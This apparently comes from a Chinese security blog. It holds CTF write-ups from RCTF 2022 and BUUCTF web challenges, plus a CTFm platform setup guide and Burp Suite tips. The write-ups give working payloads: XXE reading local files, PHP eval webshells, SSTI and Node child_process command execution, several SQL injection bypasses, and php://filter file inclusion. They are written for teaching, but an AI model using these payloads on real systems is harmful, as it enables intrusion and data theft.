[{"title":"2022 RCTF WP","url":"/2022/12/16/2022-RCTF-WP/","content":"队内大师傅们太强了，被带飞了\n\nezbypass先看 Filter\n\n\n普通的访问会显示 auth fail，这里就需要 bypass，用来 bypass 的方法很简单，使用 /index;.ico 即可 bypass，接着我们去看接口\n\n\n看 /index 接口，四个传参，首先 password 这里做了一个限制，是去数据库里面找的，并且要求 length&lt;=50，看了一下题目给的 .sql 文件，里面是没有给出 password 的，所以去找这个 password 到底是什么。一路跟，发现在 UserProvider 类中存在 selectByPassword() 方法，进行了 password 的查找。\n\n\n一开始没有意识到这是支持 OGNL 表达式的，大意了，一直在思考 password 如何能够在单引号被过滤的情况下 bypass，基础太差了。\n所以此处的 bypass 用此 payload\n$&#123;&quot;\\u0027&quot;&#125;) or 1&#x3D;1 #\n\n接着 type 需要的是字符串，yourclasses 分为四部分，用逗号隔开，这里实例化了两个对象，并且前一个对象成为了后一个对象的参数。常规方法肯定是通过构造类似如下代码来 xxe:\nDocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = dbf.newDocumentBuilder();\nInputSource inputSource = null;\nObject wrappoc = null;\ninputSource = new InputSource(new ByteArrayInputStream(bytes));\nDocument doc = builder.parse(inputSource);\nNodeList nodes = doc.getChildNodes();\nString res = \"\";\n\nfor (int i = 0; i &lt; nodes.getLength(); ++i) &#123;\n    if (nodes.item(i).getNodeType() == 1) &#123;\n        res = res + nodes.item(i).getTextContent();\n        System.out.println(nodes.item(i).getTextContent());\n    &#125;\n&#125;\n\n准备 XML 文件\n&lt;?xml version = \"1.0\"?>\n&lt;!DOCTYPE ANY [ &lt;!ENTITY f SYSTEM \"file:///flag\"> ]>\n&lt;x>&amp;f;&lt;/x>\n\n然后使用 cat  a.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml 将其编码转换成 utf-16be 即可，最后再和前面的参数合并得到以下Payload\nGET &#x2F;index;a&#x3D;.ico?password&#x3D;%24%7b%22%5cu0027%22%7d)%20or%201%3d1%20%23&amp;type&#x3D;fuck&amp;yourclasses&#x3D;%6a%61%76%61%2e%69%6f%2e%42%79%74%65%41%72%72%61%79%49%6e%70%75%74%53%74%72%65%61%6d%2c%5b%42%2c%6f%72%67%2e%78%6d%6c%2e%73%61%78%2e%49%6e%70%75%74%53%6f%75%72%63%65%2c%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d&amp;poc&#x3D;%41%44%77%41%50%77%42%34%41%47%30%41%62%41%41%67%41%48%59%41%5a%51%42%79%41%48%4d%41%61%51%42%76%41%47%34%41%49%41%41%39%41%43%41%41%49%67%41%78%41%43%34%41%4d%41%41%69%41%44%38%41%50%67%41%4b%41%44%77%41%49%51%42%45%41%45%38%41%51%77%42%55%41%46%6b%41%55%41%42%46%41%43%41%41%51%51%42%4f%41%46%6b%41%49%41%42%62%41%43%41%41%50%41%41%68%41%45%55%41%54%67%42%55%41%45%6b%41%56%41%42%5a%41%43%41%41%5a%67%41%67%41%46%4d%41%57%51%42%54%41%46%51%41%52%51%42%4e%41%43%41%41%49%67%42%6d%41%47%6b%41%62%41%42%6c%41%44%6f%41%4c%77%41%76%41%43%38%41%5a%67%42%73%41%47%45%41%5a%77%41%69%41%44%34%41%49%41%42%64%41%44%34%41%43%67%41%38%41%48%67%41%50%67%41%6d%41%47%59%41%4f%77%41%38%41%43%38%41%65%41%41%2b%41%41%6f%3d HTTP&#x2F;1.1\nHost: 94.74.86.95:8899\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;102.0.5005.124 Safari&#x2F;537.36 Edg&#x2F;102.0.1245.44\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6\n\n\n\neasy_upload看文件上传的接口\n\n\n有黑名单过滤，但是后缀过滤并不严格，可以使用 pHP 大小写的绕过。还存在内容过滤，内容中不可以存在如下黑名单\n$this->content_blacklist = [\"&lt;?\", \"php\", \"handler\"];\n\n这里使用脏数据进行绕过\n\n\n上传路径在 /upload/对应文件名下\n成功连🐎，拿 flag\n\n\nfilechecker_mini\n简单的 ssti，ssti 点如下\n\n\n\n要让这里的 result 可控，才能 ssti，所以在路由里面，要走这一段\n\n\n利用 file -b 的特性，先说一说 file -b 这一个命令，本身这个命令会打印出相关信息，比如：\n\n\n如果 file -b 的目标文件中有 #!，便可以将后续的内容直接打印出来，比如文件 exp1.py 当中的内容是 #! whoami，那么会拼接内容\n\n\n由此，这个题目里面我们可以直接构造如下 payload\n#! &#123;&#123;lipsum.__globals__.os.popen(\"cat /flag\").read()&#125;&#125;\n\n\n\nfilechecker_plus压缩包密码是 checker_mini 的 flag，看源码\n\n\n\n不存在 SSTI 了\n\n利用python的 os.path.join 的特性\n\n\n这道题目可以覆盖 /bin/file，原理是 /bin 下面的文件都能够执行 sh 脚本，构造 payload\n#! /bin/sh\ncat /flag\n\n且要把 \\r 去掉，因为 sh 脚本不可以有 \\r\n\n\nfilechecker_pro_maxhttps://pankas.top/2022/12/12/rctf-web/#filechecker-pro-max\ncy 一个链接，之后复现\nPrettierOnline先看接口，/build 接口处\n\n\n将一个 .prettierrc 文件写入了进去。官方文档  https://prettier.io/docs/en/configuration.html ，是支持四种格式的。\n接着看 index.js 处理 .prettierrc，api 涉及到是 resolveConfig，对应官方文档 https://www.prettier.cn/docs/api.html\n官方文档这里说，yaml 格式下的 xxx: console.log(&#39;aa&#39;) 是合理的语法，那么我们可以注入代码\npoc: global.process.mainModule.constructor._load(\"child_process\").execSync(\"sleep 10\");\ntrailingComma: \"es5\"\ntabWidth: 4\nsemi: false\nsingleQuote: true\nplugins:\n  - \".prettierrc\"\n\n发送，发现延时了10秒左右，说明是可以注入代码的，但目标靶机不出网，没法外带flag。\n绕过沙箱，最后找到了这篇 https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/)使用如下 Payload 可以成功绕过 proto 的 waf。\nglobal.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;&#x2F;readflag&quot;).toString()&#125;;\n\n最终 PoC\nvar a=`: #`;module.exports = ()=>&#123;return global.process.mainModule.constructor._load(\"child_process\").execSync(\"/readflag\").toString()&#125;;/*\ntrailingComma: es5\ntabWidth: 4\nsemi: false\nsingleQuote: true\nparser: .prettierrc\n# */\n\n\n\nezruoyi漏洞在 ruoyi-generator-4.7.5.jar 里面\n\n\n而 Ruoyi 里面自带有 sql 的 Filter\n\n\n因为过滤的是select空格 所以用 select%09 bypass\n最后\nsql&#x3D;create table ff12333331 select%09extractvalue(1,concat(0x7e,substr((select%09flag from flag),16,32),0x7e,database())) as fm from flag;\n\n\n\n小结感觉赛题质量挺不错的，原理 &gt; flag\n","categories":["WP"],"tags":["WP"]},{"title":"CTF平台之CTFm的搭建过程","url":"/2022/05/21/CTF%E5%B9%B3%E5%8F%B0%E4%B9%8BCTFm%E7%9A%84%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/","content":" CTF 平台之 CTFm 的搭建过程\n\nCTF 平台之 CTFm 的搭建过程0x01 前言感谢 EkiXu 师傅感谢 火柴 师傅\n说一说为什么要用 CTFm 吧。\nCTFm 相对于 CTFd 更加稳定，而且更加集成，那些 frpc.ini，frps.ini 都不需要自己手动配置的。\n0x02 环境准备这里很感谢火柴师傅帮我避了很多坑，要不然我会崩溃的吧😭😭\n1. 机器型号Ubuntu 20.04\n2. 工具准备node 的安装这里必须是 node16 的版本，不能是 node18 的。\ncurl -fsSL https://deb.nodesource.com/setup_16.x | sudo -E bash -\nsudo apt-get install -y nodejs\n\n这里在安装 node16 的时候很可能在装完之后输入 node -v 之后没反应的，这里需要使用的安装命令为，我记得 Ubuntu 会提示你的，按照提示的来就可以，好像是加上 --fix 的参数。\nsudo apt-get install -y nodejs --fix\n\n再安装 yarn，这里对 yarn 没有版本需求\nnpm install --global yarn\n\ndocker 及一系列东西的安装首先安装 docker\nsudo apt-get update\nsudo apt-get install docker\n\n安装 docker-compose，这里挺坑的，要安装最新版本的 docker-compose，不然到后面容易踩坑。\nsudo wget -O /usr/local/bin/docker-compose \"https://github.com/docker/compose/releases/latest/download/docker-compose-https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)\"\n\n再进行授权与验证\nchmod a+x /usr/local/bin/docker-compose\n\n//验证\ndocker-compose --version\n\n0x03 开始搭建1. 创建 docker-swarmdocker swarm init\n\n2. 标记节点docker node ls #检查节点 ID\ndocker node update --label-add name=linux-1 &lt;节点 ID>\n\n3. 拉取代码git clone https://github.com/EkiXu/CTFm\ncd CTFm\n#拉取子模块\ngit submodule update --init --recursive\n#创建log文件夹\nmkdir backend/log/\ncd backend/log/\nchmod 777 log -R    // 这个很重要，不然会踩坑的\n\n这一步如果卡的话，多操作几次，或者开代理。我搭建的时候代理一直配不起来。\n4. 创建相关 secretecho -n \"Z3brFdddeh2F37G2rTB\" > \"./secrets/DB_PASSWORD\"\n\necho -n \"r1vMTdppMcdvvPFk7bB\" > \"./secrets/REDIS_PASSWORD\"\n\necho -n \"o1bGorxEMZdXsq2WuJZ\" > \"./secrets/SECRET_KEY\"\n\n这里用随机的就可以，和我一样也可以。\n5. 前端代码生成(可选)\n5,6 两步我都没有进行部署\n\ncd frontend\nyarn install\nyarn build\n\n\n6. 中台代码生成(可选)cd dashboard\nyarn install\nyarn build\n\n7. 使用docker-compose编排启动sudo docker-compose up -d --build\n\n8. 数据库和管理员账号初始化\n这里的管理员账号不要输错，不然挺麻烦的。\n\nsudo docker-compose exec ctfm /bin/bash \npython manage.py migrate\npython manage.py createsuperuser\n\n\n至此，已经可以访问了，默认的是 80 端口\n\n0x04 一些其他设置1. 关于recaptcha验证码这是一定要配的，如果不配的话无法完成注册，不过是要付费的。\n需要自行到https://www.google.com/recaptcha/获取客户端密钥和服务端密钥。\n这里的密钥版本是 v2 的，不要踩坑去弄了 v3 的。关于密钥的位置在这个地方获取，当时我也是找了一会儿。\n\n\n进去之后要先自己创建项目的，这些都挺简单的，密钥的话在这里。\n\n\n客户端密钥存放在 frontend/.env 下\nVUE_APP_BASE_API = '/api/v1'\nVUE_APP_RECAPTCHA_PUBLIC_KEY = '&lt;your RECAPTCHA_CLIENT_KEY>'\n并重新生成前端\nyarn build\n\n在服务端设置中添加\n#backend/CTFm_backend/settings.py // 文件位置\nDRF_RECAPTCHA_SECRET_KEY = \"&lt;your RECAPTCHA_SERVER_KEY>\"\n\n2. 关于邮件验证功能这里如果是小比赛不需要配，像校内的比赛就不需要了。\n我这里就略过了，如果需要配的师傅们可以去官方文档这里看CTFm&#x2F;README.zh.md at master · EkiXu&#x2F;CTFm (github.com)\n邮箱验证自己的小比赛不需要是因为可以在 admin 下修改 user 权限\n3. CTFd-Whale 插件的配置CTFm 真的比 CTFd 方便快捷太多了，这里都不需要进行配置，直接集成就有了。在起完项目 docker 服务之后，以管理员账号登入，在左侧的 Dashboard 下点 admin，进行 Whale 配置。\n\n\n几点注意事项说一说，以防踩坑\nFrp HTTP Domain Suffix 可以不填的，就空在那儿。\nFrp Config 这里，是把 frpc.ini 的全部内容粘贴进来的，当时我这里也踩坑了。\nFrp Direct IP address 就填服务器 IP 即可。\n如果一直弄不起来的话，检查一下 frpc.ini 与 frps.ini 的token，最好不要随机，写一个大致 8 位长的密钥即可，要两个一致。\n0x05 题目设置主要是 Web 类的题目，如果要使用 dynamic container 的话，并且不是使用域名的情况下，设置应当注意一下这个。\n\n\n如果使用了域名，需要选择 HTTP 80 端口\n0x06 小结官方文档的内容还是比较少，我这里基本把所有的坑都踩了一遍。\n像我这么粗心的人的话，搭建 CTFd 对我来说太难了，我个人强推 CTFm\n","categories":["环境搭建"],"tags":["环境搭建"]},{"title":"Burpsuite使用中的踩坑合集","url":"/2022/05/05/Burpsuite%E4%BD%BF%E7%94%A8%E4%B8%AD%E7%9A%84%E8%B8%A9%E5%9D%91%E5%90%88%E9%9B%86/","content":"Burpsuite使用中的踩坑合集\n\nBurpsuite使用中的踩坑合集1. 无法使用 Burp-Collaborator原因：被 WAF 墙了，手机开热点就行。\n2. Web Cache 中添加 X-Forwarded-Proto 标头失败原因是别放在 connection:close 后面\n3. 抓包 google 等外网失败需要开启 Burpsuite 代理模式\nUser options -&gt; Connections -&gt; SOCKS Proxy\n4. Communication Error\n\n5. 解决 Burpsuite 抓包无法抓到 localhost 的问题在 SwithchyOmega 中设置\n在不代理的地址列表中添加&lt;-loopback&gt;即可\n","categories":["踩坑合集"],"tags":["踩坑合集"]},{"title":"Buu之Web部分刷题记录","url":"/2022/07/20/Buu%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/","content":"BUU 刷题\n\nACTF2020-新生赛Upload界面如图所示，很明显的文件上传题目\n\n\n简单先编写一个 shell.jpg 的文件，编写一句话木马\n&lt;?php @eval($_POST['shell']);?>\n\n然后直接上传，上传成功\n\n\n抓包后，修改后缀为 .php，不出所料得被阻挡了，换成 .phtml，成功上传，并通过中国蚁剑连接。找出 flag\n\n\n源码解析\n\n\n第 110 行if(in_array($ext, [‘php’, ‘php3’, ‘php4’, ‘php5’])) 判断后缀是否在此数组中，简单过滤 php\n第 114 行$new_file_name = md5($file_name).&quot;.&quot;.$ext;  将文件名转换为 md5 的形式，再上传。\n在文件夹中还发现了 .htaccess 文件，所以还可以通过覆盖 .htaccess 文件的方式进行 getshell\n\n强网杯2019-Upload0x01 题目根据题目名称来看，既然是 Upload，那就不去考虑登录注册界面的 SQL 注入了。\n简单注册登录之后的界面\n\n\n上传简单的一句话木马，会被过滤。尝试进一步的 EXP\n&lt;script language='php'>eval($_POST['cmd'];&lt;/script>\n\n上传成功，之后是一个 &#x2F;upload 的界面，没看懂\n\n\n既然是上传成功了，看一看能不能直接连接 shell 吧。\n连接失败，应该是被解析了，或者不在这个位置吧，去看看 Js 里面有没有玄机。\n解密了一下，也不是 md5；Js 写的也没问题。\n没啥思路啊，想办法去找源代码\n0x02 找源代码尝试把 cookie 扔进去 base64 解析一下，发现确实有疑点，说不定是反序列化的题目。\n\n\n这里我们可以看到 img 的位置，但是并没有被解析成 php 或者 html，js 等等可执行的语句。\n用御剑扫出源码，目录为 /www.tar.gz\n下载源代码，先看路由\n\n\n一切正常，主要看 upload 的功能点，文件位置位于 Profile.php 下\nif($this->ext) &#123;\n if(getimagesize($this->filename_tmp)) &#123;\n @copy($this->filename_tmp, $this->filename);\n @unlink($this->filename_tmp);\n\t$this->img=\"../upload/$this->upload_menu/$this->filename\";\n\t$this->update_img();\n&#125;else&#123;\n\t$this->error('Forbidden type!', url('../index'));\n&#125;\n&#125;\nimg 这里的 upload_menu 和 filename 都是可疑对象，逐个排查一下。\n\n\n清楚了，果然是 md5 加密，再去看 filename 的。\n\n\nFilename 则是先经过 md5 加密之后再转换成 png 的格式。\n感觉没啥用，去找序列化的功能点。\n、\n\n也没啥用，好好分析一下文件上传这个功能点。\n\n尝试一下利用 GET 请求绕过\n\nRoarCTF2019-EasyCalc0x01 题目靶场界面如图所示\n\n\n既然是输入表达式，那么直接输入 2*2 试试\n\n\n得到结果为 4，这里猜测是否存在 ssti，输入 &#123;&#123;2*2&#125;&#125;，发现有一种被 WAF 拦截的感觉。\n\n有点没思路了，f12 看看\n\n\n\n果然是设置了 WAF，不过这种 WAF，CTF 里面怎么可能是真正的 WAF 设备，只是一些规则吧。\n还有一点非常引人注目，url 这里，看到了 calc.php，我们跳到 calc.php 看看。发现了一段过滤规则的源码，拷到 vscode 里面。\n0x02 代码审计&lt;?php\nerror_reporting(0);\nif(!isset($_GET['num']))&#123;\n show_source(__FILE__);\n&#125;else&#123;\n \t$str = $_GET['num'];\n \t$blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^'];\n \tforeach ($blacklist as $blackitem) &#123;\n \t\tif (preg_match('/' . $blackitem . '/m', $str)) &#123;\n \t\tdie(\"what are you want to do?\");\n \t\t&#125;\n \t&#125;\n \teval('echo '.$str.';');\n&#125;\n?>\n\n这里 preg_match 的写法挺有意思的，可以借鉴一下\nforeach 进来，匹配不同的规则 /m 这里多行查找，避免了 CRLF 的绕过手段，\n0x03 绕过手段使用空格绕过，当php进行解析的时候，如果变量前有空格，就会删去空格再进行解析。而前面的黑名单中就没有考虑到这个状况，我们就可以在num的前面加个空格来绕过，因为这是我们的变量名就是“ num”而不是“num”了。\n尝试一下\nhttp:&#x2F;&#x2F;node4.buuoj.cn:27411&#x2F;calc.php?%20num&#x3D;phpinfo();\n\n确实可以\n\n\n0x04 构造 EXPOK，我们已经知道如何利用了，接下来就是要去找 flag 所在的地方。在 PHP 中的命令为 scandir，那么我们的初步 EXP 为\nhttp:&#x2F;&#x2F;node4.buuoj.cn:27411&#x2F;calc.php?%20num&#x3D;print_r(scandir(&#x2F;));\n\n注意到之前的地方，/ 也是被过滤的，这里我们使用 chr(47) 绕过斜杠\n\n\n看到这里有个文件夹名为 flagg，用 file_get_contents 把它搞出来。\n读取 flagg，对应一个个的 ascii 码。\nfile_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))\n\n\n\nRoarCTF2019-Easy Java弱口令 admin，admin888 进去，发现没什么信息\n将help界面用 POST 发包，能够进行任意文件读取。因为是个 Java 题目，去读 WEB-INF/web.xml\n\n\n读与 flag 有关的 FlagController，但是这里是需要加上后缀 .class 的\n\n\nZmxhZ3tlMDM1MjM5MS0xMTliLTRmZTUtOWVhOS0xMDEzMTMyZjYzMTR9Cg==\f base64 解码\nflag{e0352391-119b-4fe5-9ea9-1013132f6314}\n极客大挑战 2019 BabySQL老方法，先输入1&#39;来观察SQL语句，确定SQL闭合之后开始尝试\n发现万能密码，联合注入都不行\n\n\n使用order by判断字段数，也不行，而且发现输入的order只剩下了der，or被过滤。得出结论，union，select，or都被过滤。\n\n尝试双写绕过\n\n1' uniunionon selselectect 1,2,3#\n\n成功绕过\n\n\n1' uniunionon selselectect 1,database(),3#\n\n\n\n这里想要进行下一步的爆破表名，结果爆破的时候居然出问题了\n1' uniunionon selselectect 1,group_concat(table_name) from information_schema.tables where table_schema='geek',3#\n\n\n\n发现from和where也被过滤了……………………\n继续进行双写绕过，其中information中因为有”or”，所以也要对”or”进行双写绕过。\npayload\n1' ununionion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='geek' #\n\n\n\n爆破column名\n1' ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema='geek' #\n\n\n\n最后：\n1' ununionion selselectect 1,2,group_concat(passwoorrd) frfromom b4bsql #\n\n\n这里的“password”也需要进行双写绕过\n\n\n\n极客大挑战 2019 EasySQL先输入1&#39;测试SQL语句\n得知SQL语句后，进行联合注入，直接出来了…………\n\n\n极客大挑战-2019Http打开靶场，就是一个 php 的界面，抓包之后发包，无发现可利用信息。\n因为题名为 HTTP，马上想到 HTTP 请求，于是输入 id &#x3D; 1，无其他回显。用 Burpsuite 内置的工具，检查一下是否存在可疑界面\n\n发现了一个可疑网站，进去康康\n\n\n点进去之后界面如图所示\n\n\n虽然提示说 “It doesn’t come from ‘https://Sycsecret.buuoj.cn‘ “ 不管，头铁就是要进去看看。结果 500 了\n这里很可疑的是 Referer，修改 Referer 为 上述 URL 试一试。\n\n\n出现了不一样的回显，是个好消息。但是还是没有搞到 flag，根据提示 “Please use “Syclover” browser”，Syclover 怎么可能是个浏览器，此时想到 User-Agent。替换 User-Agent 再尝试一次。\n\n\n回显再次改变，”No!!! you can only read this locally!!!”\n伪造 XFF: 127.0.0.1\n\n\n成功获取到 flag~\n小结本道题主要考察了 HTTP Headers 的一堆知识，这里再总结一下\nReferer：Referer 请求头包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 Referer 请求头识别访问来源。Referer 实际上是 referrer 的错误写法哈哈哈哈。\nUser-Agent：简写也叫 UA，是特征符，每一个软件都对应一个 UA。同样的，UA 可以被事先伪造。比如 Xray 的 UA 会被伪造成 Firefor Mozila。\nXFF：全称 X-Forwarded-For，在客户端访问服务器的过程中如果需要经过HTTP代理或者负载均衡服务器，可以被用来获取最初发起请求的客户端的IP地址。\n极客大挑战-2019Knife点进去看，这……简单 getshell？\n直接中国蚁剑动手\n\n\n连接成功，直接在根目录文件夹里面找到 flag\n\n\n\n极客大挑战 2019 LoveSQL\n进入界面，输入一个数字1，查看SQL语句\n\n\n\n\n根据SQL语句的闭合，使用万能密码登录\n\nadmin' or '1'=1'\n\n\n\n但是再使用这个密码登录之后，发现还是同一个界面\n使用联合注入，发现报错\nadmin' union select 1,2,3,4#\n\n\n\n最后判断得到字段数为3\n\n\n发现2，3位置可被查询\n\n这里前面的username一定不能是admin，一开始用admin一直不行，后面看了WP才改成了1\n\n1' union select 1,database(),3#\n\n\n\n发现数据库的名称为geek，开始进一步查询\n1' union select 1,group_concat(table_name) where information_schema.tables where tables_schema='geek',3#\n\n结果得到报错\nYou have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '3 %23' and password='1'' at line 1\n\n尝试放到3字段中\n1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()\n\n\n\n再进一步爆破column名\n\n\n只有一个payload检索出flag\n1' union select 1,2,group_concat(password) from l0ve1ysq1\n\n\n极客大挑战 2019 HardSQL\n很古早的题目了，现在再回顾一遍\n\n先 fuzz，看一下哪些关键字被过滤了。发现过滤了 and、&#x3D; 空格 union等多个 sql 关键字。发现有一些，报错注入的函数是没有被过滤的，那我们这题就可以通过报错注入来进行注入。\n所以本质上就是一个报错注入，构造 payload\n1%27or(updatexml(1,concat(0x7e,database(),0x7e),1))%23\n\n\n\n这里因为被过滤了空格，所以用 () 来 bypass 空格，payload 如下\n1%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23\n\n\n\n爆字段\n1%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(%27H4rDsq1%27)),0x7e),1))%23\n\n\n\n要把所有的 username 和 password 爆出来\n\n\n如果是用 substr() 函数，这里是不行的，因为会被过滤，所以要另辟蹊径，用 left() 和 right() 绕过，构造 payload 如下\n1%27or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))\n\n极客大挑战-2019Secret-File靶场界面如图所示，看到这个题目加 index 的界面，感觉就是扫目录了。\n\n\n用 Burpsuite 扫静态资源，查找到一个名叫 “&#x2F;Archive_room.php”的目录。\n\n\n输入后界面如图所示\n\n\n点击无比诱人的 Secret，发现屁都没有。\n\n\n它说我是不是没有看清，抓包试试，感觉中间丢了什么。果不其然，抓包后得到在跳转中，夹带了私货的 “action.php”，查看界面，哼哼，被我抓到了吧。\n\n\n进入 &#x2F;secr3t.php，出来了一段 php 的代码，简单代码审计一下。\n\n\n\n看到注释，说 flag 在 flag.php 里面，结果又被骗了………………\n\n\n\n这里说我看不见它，我觉得是背景太黑了，调整试一试。\n\n\n好吧，没什么用。还是回去，沉下心来代码审计。\n&lt;html>  \n &lt;title>secret&lt;/title>  \n &lt;meta charset=\"UTF-8\">  \n&lt;?php  \n    highlight_file(__FILE__); \n\terror_reporting(0); \n\t$file=$_GET['file'];  \n    \tif(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\"))&#123;  \n        echo \"Oh no!\";  \n        exit();  \n    &#125;  \n    include($file); //flag放在了flag.php里  \n?>  \n&lt;/html>\n\n很显然，是获取 GET 请求的参数 File，File 当中不能由目录遍历的攻击，也不能出现 “tp” “input” “data”； 尝试一下 File &#x3D; flag.php；也失败了\n猜测存在文件包含漏洞php:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。php 读取文件时是通过这样的方式的\nphp://filter/read=convert.base64-encode/resource=flag.php\n\n所以构造 payload \n?file=php://filter/convert.base64-encode/resource=flag.php\n\n\n\n再将得到的答案进行 base64 解码，即可获得 flag\n极客大挑战-2019Upload靶场部分看名字就知道是文件上传了。题目界面如图所示\n\n\n这背景看着就烦，先删了。\n拿 Buprsuite 抓一下包，观察一下上传文件的请求。这里我上传的是 jpg 的文件，上传之后的界面如图所示\n\n\n不太懂，不是说上传 jpg 的吗…………为啥会这样。按照道理来说至少 jpeg&#x2F;jpg&#x2F;image 这种，起码能传上去阿……………………算了，毕竟是 CTF，直接传 php 好了。\n\n\n呃，PHP 应该说是肯定会寄的，试试文件上传的一些普通攻击方式，尝试使用文件上传的方式 GetShell。\n一句话木马。对应编辑文件 ———— shell.jpg\n&lt;script language='php'>eval($_POST['cmd'];&lt;/script>\n\n尝试上传失败，表明网页存在后端检测，添加 jpeg 图像头\n\n\n再用 .phtml 的方式绕过\n\n\n猜测网站将上传的文件全部存在了 &#x2F;upload 目录下，直接访问 &#x2F;upload \n\n\n\n找到我们的 shell.phtml，用蚁剑连。\n网站：http:&#x2F;&#x2F;a8f651b3-11d3-4223-be9a-0d6e367040e0.node4.buuoj.cn:81&#x2F;upload&#x2F;shell.phtml\n\n密码 cmd\n\n连接上之后 找出 flag\n源码部分我们现在解出题目了，回来看看源码，先说说本人在尝试的过程中遭遇的困境吧。\n\n在正常的渗透测试环境中，jpg 的文件是肯定可以上传的，而不是上传后出现 “Don’t lie to me”\n在上传的过程中，尝试了上传 php,php2.php3 文件都失败了，怀疑上传文件中包含 php 就会被过滤。\n修改 MIME 的时候，会回显错误：NOT IMAGE\n\n\n\n代码的第 53 行开始，进行过滤操作，对上传的文件进行限制。我们逐步解读一下。\n\n第 53 行$file[“size”] &lt; 20480)  要求文件上传的内容小于 20kb\n第 59 行elseif (in_array($extension, $allowedExts)) 判断上传的文件的后缀是否是 “allowedExts” 里面的文件后缀名\n\n第 62 行\nelseif (mb_strpos(file_get_contents($file[\"tmp_name\"]), \"&lt;?\") !== FALSE)\n不允许上传的文件中包含 `&lt;?`\n\n第 65 行\nelseif (!$image_type)  非 image 后缀的上传是不允许的\n\n\n\nGXYCTF2019BabySQli老规矩，先输入 1&#39; 查看SQL语句\n\n\n尝试万能密码，SQL语句闭合，但是无法进入\n1' or '1'='1\n\n\n\n进行union的联合查询，发现当字段数为3的时候成功，但进入之后无法利用字段回显，懵逼了…………为什么会是wrong user呢……？\n\n\nf12查看源代码，发现有一段字母，意义不明，先拉出来看看吧。\n\n\n尝试base32解密之后再base64解密。\n\n\n尝试输入admin，admin作为账号密码，显示wrong pass，那admin应该是username无疑了，尝试admin与’admin’。\n那既然得到的报错是wrong user，那我们直接尝试在1&#39; union select 1,2,3 #的payload中将’1’修改为admin，返回报错。\n\n\n咦，这么看的话，第一个字段应该能够回显信息咯？尝试在第一个字段输入”dartabase()”，同样报错了。\n\n\n那说明………………应该尝试一下&#39;admin&#39;，在第一个字段输入’admin’，毕竟我们现在报错。\n\n\n尝试第二个字段中输入’admin’。\n\n\n看来username这里已经搞定了，需要对password进行绕过了。毫无头绪如何绕过……\n我们猜测search.php它的后端是怎么写的：\n$name = $_POST['name'];\n$password = $_POST['pw'];\n$sql = \"select * from user where username = '\".$name.\"'\";   \n// echo $sql;\n$result = mysqli_query($con, $sql);      \n$arr = mysqli_fetch_row($result);\n// print_r($arr);\nif($arr[1] == \"admin\")&#123;\n\tif(md5($password) == $arr[2])&#123;\n\t\techo $flag;\n\t&#125;else&#123;\n\t\t\tdie(\"wrong pass!\");\n\t\t&#125;\n&#125;else&#123;\n\t\tdie(\"wrong user!\");\n\t &#125;\n&#125;\n\n\n利用联合查询的特点：在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。\npayload：\n\n\n1' union select 1,'admin','202cb962ac59075b964b07152d234b70' #\n\n“202cb962ac59075b964b07152d234b70”为123的md5加密值，此题由于过滤了括号，所以不能用md5()函数。在密码处输入我们自定义的密码123，即可绕过检验，成功登陆admin账户\nGXYCTF2019-PingPingPing打开靶场，界面如图所示\n\n\n结合题目名称来说，PingPingPing，加上看到的 ?ip&#x3D; 有点死亡 Ping 的感觉。先尝试 Ping 自己，然后 Ping baidu.com，再 Ping Google.com，列表展示一下回显。\n\n\n\n输入\n回显\n\n\n\n?ip&#x3D;127.0.0.1\nPING 127.0.0.1 (127.0.0.1): 56 data bytes\n\n\n?ip&#x3D;baidu.com\nPING baidu.com (220.181.38.251): 56 data bytes\n\n\n?ip&#x3D;google.com\nPING google.com (8.7.198.46): 56 data bytes\n\n\n当然，这里 Ping Google.com 肯定是被 DNS 劫持了，一看就是错误的 IP。\n\n没有后续的思路了，尝试用 Burpsuite 抓包试一试。\n\n并没有什么卯用\n\n\n考虑到题目名叫 PingPingPing，尝试继续添加 &#x2F;?ip&#x3D;127.0.0.1，查看回显。\n\n哦嘿，有点东西\n\n\n\n再加一个？达到 PingPingPing 的效果，可惜效果并不尽如人意，抓包，仔细分析一下 fxck 那张图的请求。\n\n好吧，还是没什么用………………\n\n！！！！！！！！！！！！柳暗花明又一村！！！！！！！！！！！！！\n因为在输入两个 /?ip=127.0.0.1 之后，前端的回显是 /?ip= 1fxck your symbol!直接用这个参数，试一试通不通。Nice 起飞！\n\n\n但是使用 /?ip= fxck your space! 